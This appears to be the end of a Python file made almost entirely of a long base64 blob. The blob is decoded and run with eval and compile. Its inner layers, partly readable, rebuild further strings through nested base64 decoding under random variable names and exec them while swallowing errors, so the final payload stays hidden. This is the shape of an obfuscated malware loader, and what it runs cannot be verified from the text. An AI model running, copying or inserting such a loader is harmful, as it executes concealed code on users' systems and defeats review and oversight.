lJHY0VobFIwWnFZbFZhUjFwRldrdFViVVY2VVd4c1dGWnNXbFJWVkVaaFZqRk9XV0pHV21saE0wSm9Wa1pXWVZsV1VrZFhiazVZWW14d2MxVnRlRXROVmxwWVpVZDBWV0Y2UmtkWk1GSkhWMGRLUjFkdVNscFdSVnBQV2xaYVYyTXlTa2hoUms1WFRXMW9iMVp0Y0VOV01VMTVWV3RrYVZOR1NsQldibkJ6VmtaU1YxWnNaRTlXYkVZMFZqSjBNR0ZHU1hkalNIQlhUVmRvZWxZeU1VWmxWbFp6VVd4V1YwMHlaM3BXVkVKV1RWWlplRkp1VW1sU2F6VndWakJrVDAweFdYbGtSMFpvVFZkNFdGWXlkR3RoUlRCNVpVaE9WbUpHU2xoV2FrWlhaRmRPUjFwRk9WZGlTRUkwVmxSSk1XRXlSa2hUYTFwWFlXeGFXRlZxVG05bGJHUlhWMnR3YkZJd05VaFdNbmgzWVVVeGMxSnFUbGhXTTBKSVdWUkdhMVl5VGtaYVIyeFRZbXRLZDFkV1VrOVJNbEp6VjJ4b2JGSnRVbFJVVjNNeFYwWmFTR1ZIT1ZkaVZWa3lWVzE0YTFZeVNrZGpSRTVhWld0YVlWcEVTa2RUUjFKSFYyczFhR1ZzV2xsV2EyUTBZV3MxVjFkclpGaGhiSEJ3VlcxNGQxbFdXbk5hUnpscVlrZDRWMVl5ZUhkaE1ERkZZa1prWVZaV2NHaFdNRnBQVW14T2MxVnNaRTVXTVVZelZtMXdSMWxYVFhoalJWcG9VbTFTY0ZWc1VsZGxWbVJZWkVaa1dsWnNXa2hXYlRWUFZqSktXVlZzVWxaaGEwcDZWRzE0Y21ReFZuTlViV2hUVFVoQ1NWZFVRbTlTTVdSMFZtNUtUMWRGY0ZkYVYzUmhWMFpzTmxKc1RtcGlWVnBJV1RCa2IxUnJNVlpqUms1WFlsUkZNRmxxU2twa01ERlhXa1pXV0ZJeFNubFdWM0JMWWpKSmVGWllaR2hTVlRWWlZXMHhNRTB4WkhKaFJUbFhZWHBHV1ZaWGVIZFdiVXBWVm01S1dsWnNjRXhhUldSSFVqSkdSMWR0YUdobGJGcEdWakowVTFJeFNuUldiazVoVTBWd1YxbHJXa3RXUmxKWFYyNWtWMDFYVWxsWk1GWXdWakF4V0dWR2JGWk5hbFpNVmpCa1JtVlhWa2RYYkhCcFVqSm9SRmRzVm1GV2JWRjRWMjVLVUZadGFGaFVWVkpHVFZaYWRFMVljRTlXYlZJd1ZUSjBiMkpHU25SVmJHaFZWbnBXVkZVd1duZFRSMVpKVkd4b1UwMUVWa2RXVnpFMFZqRlZlRnBGWkZSaVIyaFpXVlJLVWsxR1ZqWlNiVVpYVFZaS2VsWXlNWGRWTVZsNllVaHdXRll6VWxoWFZscEdaVWRGZW1GR1pGaFNNbWhYVm0xd1IxbFZNVmRYV0d4UFZsaFNWMWxzVmxkT1JsVjVZek5vVjAxVmJEWlpWV2gzVm14WmVtRkZkR0ZXVjFKSVZXMTRkMU5IUmtkVWJHUnBVak5SZWxadGVGTlJNVmw0VjFoc1ZtSnNTbFpaYTFwM1lqRlZkMWR1WkZwV2JFcFhWakl4UjFkc1duTmpSbXhWVm14S1ZGbFZaRXRXYkdSellrWmFUbUpzU2xWV2FrbDRVekZLYzFSdVJsVmlTRUp3VldwS2IxVldXblJrUjNSV1RXczFNRlpIZEdGV1IwcEhVMnM1V21KR2NFeFVWbHBoWTJ4a2MxcEZOVk5OUkZaSlZtdGpNVk14WkVoVGEyUnFVbTFTV0ZsclpHOWtiRlkyVW14a2FtSklRa2RhUldSM1lWWktXR1I2UmxkTmJsSm9Xa1JLUjFkR1RuSmhSbHBvVFRGS1dWWnRlR3RWTVdSSFYyNU9XR0V5VWxoWldIQlhWakZ3Umxkc1RsZFNhM0JYV1RCYVExZEhTa2RqU0VwWFVrVndTRlpxU2tabGJVcEhZVWRzVTFaR1dqSldiVEUwWWpGRmVGWnJaRmhoTVZwVFdXdFZNV05zVWxkV1ZFWnNZa1p3V1ZSV1VsTmhSVEZXWTBaa1drMUdXbGhXTUdSTFYxZEdSbFZzWkZkU1dFSlpWbTF3UjFsWFRuTldibEpwVW1zMVdGbFVUa05TTVZsNFYyeE9WRTFXUmpSWGExcHJWakpLY2s1V1ZscGlSa3A2Vm1wR1YyUkZNVmRVYkdSWFlrZDNNRmRXVm1wT1ZsWnlUVlprV0dKSGFGbFpWRXB2Wkd4WmQxcEZkRlJTYkZwNlZWZDRiMVl5Vm5KWGJGWlhWa1Z2TUZWcVJtRmtSbFp5V2tab2FWSlVWbEJXUmxaaFpERktSMWRzYUd4U2JWSndWRmQwYzA1V1ZYbGtSM1JYVWpCYWVsa3dhRU5XYlVaeVRsaFdWVll6YUZoV2JGcEhaRlpTYzJGR1pFNVNSbHBoVmpGU1EySXhWWGhYV0d4VVlURndXVmxYZUhkWFJsSldXa1pPV0ZKc1ZqVlVWbFpyWVcxS1IyTkVRbHBoTWxFd1ZtcEJlRkl5VGtkVWJHUk9WbXR3UlZac1VrZFNNbEpIVTI1T2FGSXpVbFZWYkdoRFZqRmFjVkZ0Um10TmF6VjZWakowVjFaWFNraFZia0pYWWxoTmVGVXllSE5XYkd3MlZteHdWMkpIT0hsV1Z6QXhWVEZrU0ZOcmFGVmhiRXBoV1ZSR2QyRkdXWGRYYXpscVlrWmFNRmt3WkhOVk1ERjBWR3BTVjJKVVFqTmFWVnB6VmpGU1dXRkdVbWxoTTBKM1ZsY3dlRlV5VFhoWGJrWlRZVE5TV1ZWdGVHRk5SbEp6VjIxMFZrMUVSbmxXTW5odlZqQXhkVkZyVWxkaGEzQkhXbGQ0UjJOdFJrZGFSazVwVmpKb1RsWnRlRmRaVjBWNVZXeGtXR0pyV2xkWmJHaFRZMFpzYzFwSE9WZGlSMUpaV2xWa1IxWkZNWEpYYkdoWFVqTm9hRlpVU2tkak1rNUpVV3h3YVZKcmNGbFdWRUpoV1ZaS1YxSnVUbUZTYkVwVVZGWmFkMU5zV25GVFdHaHBUVlp3TUZVeWVGZGhWa3B5VjIxR1dtRXhjRE5WTUZwaFpFZFdSMWR0ZUdsU2JrSTBWbXhrTkdJeVJsaFRhMXBvVFRKNFdWbHJaRkpOUmxZMlVtdDBhazFWTlhsWmExcFRZVlpLVlZac2JGZGlXR2hYVkZaYVlXTXlTa2RXYkU1b1RURktVVmRYZEd0Vk1VNUhWMnhvVDFkRk5XRldiWFIzVm14YWRHUkdUbGRpVlZZMVZsYzFkMWxXU25SVmJFSldUVVpWTVZac1dtdFdWVEZGVFVRd1BTY3BMbVJsWTI5a1pTZ2lkWFJtTFRnaUtRcEVRVWxUV1Y4MU1ERWdQU0E1TWpneE56STNDbWRoYm1SbGNsODVNU0E5SUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvSjFadGVHcGxSMVp5VGxaa1ZtRXlVbFZaVkVvMFYxWnNjbFp1WkZoV2JIQXdXa1ZrUjJGVk1WbFJhMXBXWWxSQk1WWnNXa3RqTVZweFYyeGtVMDB5YUVWV2FrSmhWMjFXU0ZOcVdsUmlSbkJ3VmpCa2IySXhXa2hOU0doVVRWWndlVlF4V2xkVk1rcFpVV3hTVlZaV2NETldSRVpyWTJ4cmVtRkdXazVoTVc5M1ZsUktNRmxYUm5OVGEyUnFVbXhhVjFsc1VrWmxiSEJXVjIxMFYwMVlRa2RhUlZVeFZqSkdObFpzYkZoV1JVcDJXa1JLUm1WV1NsbGFSVGxYVmtaYVdsZFhkR0ZrTURCNFZtcGFVMkV6VWxSWmExWjNUVlpXV0UxVVFtaFNNVm93V2tST2IxWXhXWHBWYldoV1lXdGFhRnBGV2t0a1ZrNXlUbFprV0ZKVmNGbFdhMXBYWVRGVmVWUnNaRmhYUjFKWVZtdGFZVll4Vm5GUmJtUk9VbTE0VjFsVll6VldNVnBWVW01b1YySllhRVJXYlRGTFZsWktjMkZHY0ZkV2JrSlpWbFJHWVdFeVRuSk9WbVJXWWtkU1dWVnRkRmROTVZsNVpVZHdhMDFFVmxsV1JtaHZZV3hLV0ZWc2JGcFdNMUl6V1hwR1YyUlhUa2RhUlRsVFlraENObGRXVm1GVU1WcFlVMnRrVkdKSGFHRldiRnBoVlVaYVZWRllhR3BoZWxaS1YydGFZVll4U2xaV2FsSllZVEZ3YUZWNlNsTlNNVkoxVTIxd1UwMXRhRkJXUmxKRFV6RmFWMWRzWkdGU1JVcHhWRlZTVjFOV1dsZGhTRTVXVFd0d01WVlhOVTlXYXpGSFYyMW9ZVkpXY0ROVmJYaDNVbXM1V0dOR1RrNVNNMlEyVm10U1IyRnJNVmRYYmtwT1ZteHdXVmxVVGtOWFJsWnlWbTVrYUZKc1ZqTldNbmhyVjBaS2NtTkliRlZpUm5CWVZsUkdhMU5IUmtsaFJtUlhUVEpvYjFkV1VrdFNiVlpIVkc1T2FWSnRhSEJaVkVKM1YwWmFSMVZyWkZwV2JFcElXV3RvVTFReFdYcFZiR1JhWVRKTk1WUnNXbUZUUjA1SFZHeGtVMkV5T0hsWFYzUmhVekZrU0ZOclpHcFNWa3BXV1ZSR2QxUkdiRFpTYTJSclZqQmFTRmRyV2s5V01EQjVZVVJhVjJKR2NGUlZha1pLWkRBeFZtRkdaR2xTTW1oWVYxZDRhMDVIVFhoWFdHUllZbTFTYzFsclpEUmxiR3hXV1hwV1YxWlVSbnBXTW5SclZsVXhXRlZxVGxwV1JYQk1XWHBHVDJNeFVuTmpSVFZwWWtWdmVWWnRNVFJaVmxGNVZXeGtVMkpyV2xSWmEyUlRWMFpaZDFkcmRFOVNiVko2VjJ0U1UyRkZNVVZTYkdoV1lrZG9jbFpyWkV0U01VNTFVMnhrYVZaRldqSlhiR1EwWVRKT1YxTnVVbE5oZWxad1ZXcE9iMWxXV25STlZFSmFWbXhzTlZWdGNHRldNV1JJVlcxR1ZWWXpRa2hhUjNoYVpVWndSazlXVG1sV1dFSkxWbGN4TkZsV1VuTlRiR3hTVjBoQ1dGbHNVa05PUmxKV1YyeE9WRkpzV25sWlZWcHJZVmRHTmxadE9WZGlXRUpRVmxSR1MxWXhaSE5hUm1ocFZsWndWVlp0TURGUk1XUlhWMjVTYWxKck5WaFZha0pYVG14YVdHUkVRbGROVlhCNldUQldiMVp0UlhoalNFcGFaV3RhTTFVeFdrZGpNazVJWWtaT1dGSlZjRTlXYlRFd1dWZEplRk5ZYkZSaWF6VldWakJrVTJOc1ZuTlZhMlJXVFZaS1dGbFZWazlXVmtwMFpVWm9WMDF1VVhkV2ExVjRZMjFLUlZadFJsTldhM0JKVmpGYWExSnRWblJTYTJ4cVVteHdXRlZzYUVOVlZtUllaRWRHVjJKV1dqQldSM1JoWWtaSmVXRklRbFppV0dnelZGZDRZVmRGTVZWVmJXeE9WbXR3U2xaVVNURlZNVnBJVTI1S1dHSlViR0ZXYTFaaFZFWlNXR1ZHWkdwV2EzQXhWMnRWTldGV1NYcFZXSEJYVm5wRk1GbHFSbFpsUmxKeVlVZDRVMVpHV21oWGJHUXdXVlpTUjJOR1pGaGhlbXhZV1d0a1UyVnNhM2RYYlhSWFRWZFNTRlV4YUd0V01rWnlZa1JPVldKR2NHaFdha3BHWlcxS1IxRnNaRmRTTTJoWlZteGpkMlZIU1hoV2JHUm9UVEpvYjFWdWNITlhSbXh5V2taT1dHSkhVbmxXYlRFd1ZqRktjbU5HWkZkTmJsSllWakl4Um1WV1ZuVlRiRlpwVW01Q1dWWnRNSGhXTVVsNFYyNVNhRkl5ZUZSWmJYUkxUVEZaZVdWSGRFOVNiR3cwVmtab2IyRldTblJWYkdSYVZrVndWRlpyV21Gak1XUjFXa1prYVZJeFNsZFdWRVpUVmpKR2NrMVdXazlYU0VKWFZtcE9iMDB4YkZkWGJVWlhUVmRTTVZaSGVHRlViRXB6Vmxob1YxSnNXbWhaVkVaaFpFWldjbGRzUWxkaVYyaFZWbTE0VTFZd01IaFhibEpzVW0xU1QxVnRlRXRsYkd0M1YyMTBWMkpWY0hsV01qRnZWbTFLV1dGRVNsVldNMmg1V2tSR2QxSnJPVmRoUjJ4VFRWVnZNbFpxU2pCV01rMTVVbXRrVkdKSFVsbFpWRTVUVjBac2MxVnJaRlZTYmtKSVZqSjRUMVV5U2xkVGEzQlhZbFJHZGxaSGMzaGtWMFpKWWtaa2FWSnJjRVZXVjNCTFZURlplRlJ1VmxSaVYzaFVXV3RhZDFac1dsaE5TR2hXVFZkNFdGWXllRzloTVVsNlZXeGtWMkZyV21oVk1GcHpZMnhyZW1GR1drNVdia0YzVjJ4V1YxWXhXWGxTV0doWVlUTm9XRmxYZEdGVFJscDBZM3BHVjFadFVqQlZiWE14VmtaS1ZtSjZTbGRpUjFGM1dWUkdjMWRHVm5KYVJsSnBZa1p3ZDFaVVFsWk5WbGw0VjI1T1lWSnJOVmRWYlRFMFZteFZlV05GVG1oaVZYQklWako0YzFsV1dsZGpSWGhhVm14V05GWXdXbGRqVms1eldrWmthVkp1UWpWV01uUlRVakZOZUZkWWFGUmlhM0JvVlcweGIyTkdiRlZSYms1UFlrZFNlVlpYZEU5V2F6RkZVbXBDVjJKVVZreFdWRXBMVjFaR2MyRkdWbGRXYTNCWlZtcENZV0V4V1hoalJXUmhVbXhhV0ZSVlVsZE9iRnBWVTI1a1UwMXJXbmxVVm1oSFZqSktXR0ZIUmxkaVdHaG9WRlJHWVZORk1WZGFSbWhYWWxaSmVGWnJaRFJVTVZKeVRWaE9WR0pJUWxsV01HaERWRVp3UlZOc1NteFdhM0F4VmxjeGQxVXhXWHBoU0dSWFlsaG9WRmw2UVRGak1rNUhXa2RHVTFkR1NsZFdWekUwVWpBMVIxWnNhR3hUUjFKdldXeFdkMlZXYTNkWGJrNVhUVmRTU1ZaR1VsZFdiRXB5VmxSV1ZsSnJWVFZWUmtVNVVGRTlQU2NwTG1SbFkyOWtaU2dpZFhSbUxUZ2lLUXB3Y205NGFXMXBkSGxmTkRFMFh6TXdOU0E5SUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2gxYm1SbGNtRnliVjgyT1RFcEtTNWtaV052WkdVb0luVjBaaTA0SWlrZ0t5QmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb1lXTnlaVjh6TWpVcEtTNWtaV052WkdVb0luVjBaaTA0SWlrZ0t5QmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb2JXOXNZWEpmTWpReEtTa3VaR1ZqYjJSbEtDSjFkR1l0T0NJcENuUnllVG9LSUNBZ0lHVjRaV01vWTI5dGNHbHNaU2h3Y205NGFXMXBkSGxmTkRFMFh6TXdOU3dnSWp4emRISnBibWMrSWl3Z0ltVjRaV01pS1NrS1pYaGpaWEIwSUU1aGJXVkZjbkp2Y2pvS0lDQWdJSFJ5ZVRvS0lDQWdJQ0FnSUNCd2NtOTRhVzFwZEhsZk5ERTBYek13TlNBOUlHSmhjMlUyTkM1aU5qUmtaV052WkdVb2NISnZlR2x0YVhSNVh6UXhORjh6TURVcExtUmxZMjlrWlNnaWRYUm1MVGdpS1FvZ0lDQWdJQ0FnSUhCeWIzaHBiV2wwZVY4ME1UUmZNekExSUQwZ1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNod2NtOTRhVzFwZEhsZk5ERTBYek13TlNrdVpHVmpiMlJsS0NKMWRHWXRPQ0lwQ2lBZ0lDQmxlR05sY0hRZ1ZXNXBZMjlrWlVSbFkyOWtaVVZ5Y205eU9nb2dJQ0FnSUNBZ0lIQmhjM01LSUNBZ0lDNHVMZ3BsZUdObGNIUWdVM2x1ZEdGNFJYSnliM0k2Q2lBZ0lDQXVMaTRLWVd4MGFYUjFaR1ZmTXpjMlh6VTRNU0E5SUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h5ZFdKaWJHVmZPRFU0S1NrdVpHVmpiMlJsS0NKMWRHWXRPQ0lwSUNzZ1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNoaVlYTmxOalF1WWpZMFpHVmpiMlJsS0VKUFRrVk1SVk5UWHpZeE1Da3BMbVJsWTI5a1pTZ2lkWFJtTFRnaUtTQXJJR0poYzJVMk5DNWlOalJrWldOdlpHVW9ZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaGpiSFZpYUc5MWMyVmZNamN5S1NrdVpHVmpiMlJsS0NKMWRHWXRPQ0lwQ25SeWVUb0tJQ0FnSUdWNFpXTW9ZMjl0Y0dsc1pTaGhiSFJwZEhWa1pWOHpOelpmTlRneExDQWlQSE4wY21sdVp6NGlMQ0FpWlhobFl5SXBLUXBsZUdObGNIUWdUbUZ0WlVWeWNtOXlPZ29nSUNBZ2RISjVPZ29nSUNBZ0lDQWdJR0ZzZEdsMGRXUmxYek0zTmw4MU9ERWdQU0JpWVhObE5qUXVZalkwWkdWamIyUmxLR0ZzZEdsMGRXUmxYek0zTmw4MU9ERXBMbVJsWTI5a1pTZ2lkWFJtTFRnaUtRb2dJQ0FnSUNBZ0lHRnNkR2wwZFdSbFh6TTNObDgxT0RFZ1BTQmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHRnNkR2wwZFdSbFh6TTNObDgxT0RFcExtUmxZMjlrWlNnaWRYUm1MVGdpS1FvZ0lDQWdaWGhqWlhCMElGVnVhV052WkdWRVpXTnZaR1ZGY25KdmNqb0tJQ0FnSUNBZ0lDQndZWE56Q2lBZ0lDQXVMaTRLWlhoalpYQjBJRk41Ym5SaGVFVnljbTl5T2dvZ0lDQWdMaTR1Q25Ob1lXUmxaRjg0T1RKZk5Ua2dQU0JpWVhObE5qUXVZalkwWkdWamIyUmxLR0poYzJVMk5DNWlOalJrWldOdlpHVW9hR0Z1WkdsdVpYTnpYekl3TUNrcExtUmxZMjlrWlNnaWRYUm1MVGdpS1NBcklHSmhjMlUyTkM1aU5qUmtaV052WkdVb1ltRnpaVFkwTG1JMk5HUmxZMjlrWlNoa2FYWnBjMmx2Ymw4ek9Ta3BMbVJsWTI5a1pTZ2lkWFJtTFRnaUtTQXJJR0poYzJVMk5DNWlOalJrWldOdlpHVW9ZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaHdaWE4wYVdOcFpHVmZOemtwS1M1a1pXTnZaR1VvSW5WMFppMDRJaWtLZEhKNU9nb2dJQ0FnWlhobFl5aGpiMjF3YVd4bEtITm9ZV1JsWkY4NE9USmZOVGtzSUNJOGMzUnlhVzVuUGlJc0lDSmxlR1ZqSWlrcENtVjRZMlZ3ZENCT1lXMWxSWEp5YjNJNkNpQWdJQ0IwY25rNkNpQWdJQ0FnSUNBZ2MyaGhaR1ZrWHpnNU1sODFPU0E5SUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvYzJoaFpHVmtYemc1TWw4MU9Ta3VaR1ZqYjJSbEtDSjFkR1l0T0NJcENpQWdJQ0FnSUNBZ2MyaGhaR1ZrWHpnNU1sODFPU0E5SUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvYzJoaFpHVmtYemc1TWw4MU9Ta3VaR1ZqYjJSbEtDSjFkR1l0T0NJcENpQWdJQ0JsZUdObGNIUWdWVzVwWTI5a1pVUmxZMjlrWlVWeWNtOXlPZ29nSUNBZ0lDQWdJSEJoYzNNS0lDQWdJQzR1TGdwbGVHTmxjSFFnVTNsdWRHRjRSWEp5YjNJNkNpQWdJQ0F1TGk0S2MyaDFjMmhmT0RNMFh6SXhPQ0E5SUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2gxYm1SbGNtRnliVjgyT1RFcEtTNWtaV052WkdVb0luVjBaaTA0SWlrZ0t5QmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb1kyeDFZbWh2ZFhObFh6STNNaWtwTG1SbFkyOWtaU2dpZFhSbUxUZ2lLU0FySUdKaGMyVTJOQzVpTmpSa1pXTnZaR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2g2WlhKdlh6TTJNaWtwTG1SbFkyOWtaU2dpZFhSbUxUZ2lLUXAwY25rNkNpQWdJQ0JsZUdWaktHTnZiWEJwYkdVb2MyaDFjMmhmT0RNMFh6SXhPQ3dnSWp4emRISnBibWMrSWl3Z0ltVjRaV01pS1NrS1pYaGpaWEIwSUU1aGJXVkZjbkp2Y2pvS0lDQWdJSFJ5ZVRvS0lDQWdJQ0FnSUNCemFIVnphRjg0TXpSZk1qRTRJRDBnWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h6YUhWemFGODRNelJmTWpFNEtTNWtaV052WkdVb0luVjBaaTA0SWlrS0lDQWdJQ0FnSUNCemFIVnphRjg0TXpSZk1qRTRJRDBnWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h6YUhWemFGODRNelJmTWpFNEtTNWtaV052WkdVb0luVjBaaTA0SWlrS0lDQWdJR1Y0WTJWd2RDQlZibWxqYjJSbFJHVmpiMlJsUlhKeWIzSTZDaUFnSUNBZ0lDQWdjR0Z6Y3dvZ0lDQWdMaTR1Q21WNFkyVndkQ0JUZVc1MFlYaEZjbkp2Y2pvS0lDQWdJQzR1TGc9PSIiIgoKZXZhbChjb21waWxlKGJhc2U2NC5iNjRkZWNvZGUocmF3X2NvZGUpLCI8c3RyaW5nPiIsImV4ZWMiKSk="""

eval(compile(base64.b64decode(raw_code), "<string>", "exec"))
